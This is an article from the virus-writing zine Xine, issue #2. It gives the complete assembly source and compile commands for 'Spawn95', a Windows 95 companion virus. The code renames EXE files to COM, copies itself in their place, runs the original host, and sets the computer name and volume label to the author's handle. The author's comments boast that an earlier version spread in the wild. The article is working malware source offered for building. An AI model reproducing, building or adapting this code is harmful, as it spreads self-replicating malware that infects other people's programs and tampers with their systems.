   ;                                        /-----------------------------\
   ;                                        | Xine - issue #2 - Phile 023 |
   ;                                        \-----------------------------/

   ;
   ;
   ; simple win 95 spawning virus
   ; use CreateProccessA to run the exe so as long as its in
   ; win95 it could load the win 3.1 and Dos files
   ; It renames the EXE to Com this means that at the Dos prompt the true
   ; file will be run but at the Windows GUI interface the exe file which is the
   ; virus will run it will search for 2 possibles files and infect 1 file if
   ; possible.
   ; First virus I have written an early version of it was release and got to
   ; AVP where it was called Win95.Companion.
   ;  I knew I should have put a name in it ;)  so Spawn95 it is version 1.1
   ;
   ;BY MURKRY
   ;notes this is a spawning Win32 virus that uses the kernel API's to
   ;call the orginal host and to find the host Does not change directories
   ;so it should be relatively harmless.  Will not work from the command line
   ;cause thats like DOS so the .com file(orginal file will be called)
   ;but for the Windows only people it will work like a charm of course
   ;it cant spread to far and if it does (shock) I'll wonder how it did.
   ;  Why write a Companion virus at all , hell ask why write viruses,
   ; no reason at all...

   ;can't wait for
   ;doppelganger97   <g>

   ;
   ; To compile:
   ;    tasm32 /ml /m3 spawn95b,,;
   ;    tlink32 /Tpe /aa /c spawn95b,spawn95b,, import32.lib
   ;

   .386
   .model flat


   Find_data       equ 139h
   Find_data_name  equ 2ch     ;where in the structure is the name

   ;Define the needed external functions and constants here.

   extrn           ExitProcess:PROC
   extrn           FindFirstFileA:PROC
   extrn           CopyFileA:PROC
   extrn           GetCommandLineA:PROC
   extrn           FindNextFileA:Proc
   extrn           lstrcpyA:PROC
   extrn           MessageBoxA:PROC

   extrn           CreateProcessA:PROC     ;used to run the host

   extrn           SetComputerNameA:PROC
   extrn           SetVolumeLabelA:PROC

   .data                                        ;the data area

   EXE_file        DB      '*'
   Fexe            dB      '.EXE',0
   Fcom            db      '.COM',0
   blank           db      ' ',0

   title1          db      'Spawn95',0
   mess            db      'Either 4 or all files in this directory ',0dh
                   db      '           are infected!!!',0dh
                   db      0dh
                   db      "'Making computers more interesting ",0dh
                   db      "Through the creation of `tronic life'",0dh
                   db      '                   Murkry/1997',0

   murkry          db      'Murkry',0

   .data?
   IOBYTES         DD      ?
   FileHandH       dd      ?
   fileHandV       DD      ?
   FIND_DATA       dw      ?
   FILETIME1       dd      ?
   FILETIME2       DD      ?,?
   FILETIME3       DD      ?,?
                   DW      ?
                   DW      ?
                   DW      ?
                   DW      ?
   FILE_NAME       DB      255D DUP(?)
                   DB      14D  DUP(?)

   counter         db      ?
   Fhandle         dd      ?
   find_file       db      Find_data dup(?)    ;size of the find data
   new_name        db      0FH dup(?)
   host_name       db      100 dup(?)
   inf_name        db      100 dup(?)
   ProcessInfo     DD      4 dup(?)
   StartupInfo     DD      18 dup(?)
   buffer          db      1024 dup (?)



   .code                                   ;executable code starts here

   HOST:
   ;lpstrGetCommandLine()
   ; returns in eax pointer to the command line appears that
   ; ecx also returns something but not sure what 05 a handle maybe

                   Call    GetCommandLineA         ;nothing pass to it
                                                   ;eax ->command line


                   push    eax                     ;What to copy pointer
                                                   ;
                   mov     eax,offset host_name    ;to where we want it
                   push    eax                     ;
                                                   ;
                   call    lstrcpyA                ;this copys the string


                   call    FindDot
                                                   ;convert the name to the
                   mov     esi,offset Fcom         ;com name which is the
                   mov     ecx,5                   ;host_name
                   rep     movsb                   ;


   ;-----------------------------------------------

                   mov     eax,offset host_name    ;have no idea why I did
                   push    eax                     ;not just copy the command
                   mov     eax,offset inf_name     ;line twices and throw the
                   push    eax                     ;zero on the end
                   call    lstrcpyA                ;inf_name is the name
                                                   ;of the exe companion
                                                   ;
                   call    FindDot                 ;
                                                   ;
                   mov     esi,offset Fexe         ;
                   mov     ecx,5                   ;
                   rep     movsb                   ;
                                                   ;

   ;We now have the host name *.com in host name now we need to find a exe file
   ;that has no *.com file associated with it

                   call   RunIt                     ;run the host_name file
   ;The host has been run now the Spawn simply needs to find another host
   ;and rename and copy itself to the old name
   ;------------------------------------------------------------------------
   ;handle FindFirst(LPSTR lpszSearchFile, LPWIN32_FIND_DATA lpffd)

           mov     eax, OFFSET find_file
           push    eax

           mov     eax, OFFSET EXE_file
           push    eax

           call    FindFirstFileA
           cmp     EAX, -1                   ;cant find exe file
           je      fini
           mov     [Fhandle],eax             ;save the handle

   ;------------------------------------------------------------------------
   ;ok we have a file now create the new name *.com
   ;just do a move until the . is found then add the .com to it
   ; movsb  ds:esi -> es:edi
   ; lodsb  ds:esi -> al
   ; stosb  al -> es:edi
   ;------------------------------------------------------------------------

   FoundAFile:

           inc     byte ptr [counter]

           push    ds                                     ;
           pop     es                                     ;take the name we
           mov     edi,offset new_name                    ;found and
           mov     esi,offset find_file + Find_data_name  ;make it a com name
           mov     ah,"."                                 ;
                                                          ;
   loop_search:                                           ;
           lodsb                                          ;
           cmp     ah,al                                  ;
           je      FoundIt                                ;
           stosb                                          ;
           jmp     loop_search                            ;
                                                          ;
   FoundIt:                                               ;
           mov     esi,offset Fcom                        ;
           mov     ecx,5                                  ;
           rep     movsb                                  ;
                                                          ;
   ;------------------------------------------------------------------------
   ; Should pobaly use the MoveFile API  to just rename the file
   ;  but too lazy to change the code now and how much time would you
   ;  want to waste on a spawning virus anyway ???
   ;CopyFileA(dword pnter file_name, dword pnter new_name, T/F Bool)
   ; 1 = true 0 = false  True means do not overwrite

           mov     eax,1                                 ;do not overwrite
           push    eax                                   ;

           mov     eax,offset new_name                   ;new name
           push    eax

           mov     eax,offset find_file + Find_data_name ;old name
           push    eax
           call    CopyFileA


           cmp     eax,0                    ;0 = false we failed so get out
           jne     OkInfectHost

           cmp     [counter],4
           je      DoneInfecting

           Call    Fnext

           cmp     eax,0                     ;0 failed search end it
           je      DoneInfecting

           jmp     FoundAFile


   OkInfectHost:

   ;CopyFileA(dword pnter file_name, dword pnter new_name, T/F Bool)
   ; 1 = true 0 = false  True means do not overwrite
   ;


           mov     eax,0
           push    eax

           mov     eax,offset find_file + Find_data_name     ;old name to copy to
           push    eax

           mov     eax,offset inf_name + 1                  ;the old host
           push    eax

           call    CopyFileA

   ;I had some vaporware ideas to copy the .resc area of the PE exe files
   ;from the orginal host to the companion this way the icon info would show
   ;up but Started toplay with the Win32 vxd service which allows Int 21 31 41
   ;calls from the Win32 program.  Seems it be fun to write a virus that
   ;only uses the callvxd0 API from the Kernel to infect a file
   ;Mite be harder to catch also :)
   ;anyway here where the quick notes I had written to myself

           ;inf_name = the new name of us
           ;new_name = orginal host
           ;open new_name copy rscr section entry
           ;              copy rscr entry
           ;      close file
           ;open inf_name
           ;write rscr entry to end

           ;read in the PE header
           ;update the num_sections 6 word
           ;           size of data    28 D ????
           ;           size of image   80 D
           ;           rscr header update pointer to raw data
           ;                       this will be old image sizeenryt + 14h
           ;will need FPointer, Fread, Fwrite
           ;

   fini:




   End_it:
           push    LARGE -1
           call    ExitProcess             ;end it

   DoneInfecting:


           mov     eax,offset murkry      ;sets the computer name to
           push    eax                    ;Murkry
           push    eax                    ;
           call    SetComputerNameA       ;

           xor     eax,eax
           push    eax

           call    SetVolumeLabelA        ;sets the volume name to murkry

           jmp     End_it

   ;-------------------------------------------------------------

   FindDot:
                   mov     edi,eax
                   mov     al,"."
   search_for:
                   cmp     al,byte ptr [edi]
                   je      found_dot
                   inc     edi
                   jmp     search_for
   found_dot:

                   ret

   ;-------------------------------------------------------------

   Fnext:
   ;bool FindNextFileA( handle, pointer Find_Data)

           mov     eax,offset find_file
           push    eax

           mov     eax,[Fhandle]
           push    eax

           call    FindNextFileA

           ret

   ;-------------------------------------------------------------------------
   RunIt:
            mov    eax, offset ProcessInfo
            push   eax

            mov    eax, offset StartupInfo
            push   eax

            mov    eax,0                   ;null        current dir
            push   eax

            push   eax                     ;null         enviroment

            push   10h                     ;creat_new_console  creatflags

            push   eax                     ;False = 0    inherit handles

            push   eax                     ;null         thread security
            push   eax                     ;null         process security

            mov    eax,offset blank        ;command line
            push   eax

            mov    eax,offset host_name + 1     ;file to run
            push   eax

            Call   CreateProcessA

            OR    EAX,EAX                  ;OOPS CANT FIND FILE
            ;JnZ   End_it                       ;SHOW MESSAGE BOX
                                           ; on the other hand why bother

            ret
   ;----------------------------------------------------------------------
   Box_it:

           mov     eax, -1
           push    eax

           mov     eax,offset title1
           push    eax                                     ;

           mov     eax,offset mess         ;find_file + Find_data_name
           push    eax                                     ;

           mov     eax,0
           push    eax

           call    MessageBoxA

           ret

   ;-------------------------------------------------------------------------

           end     HOST
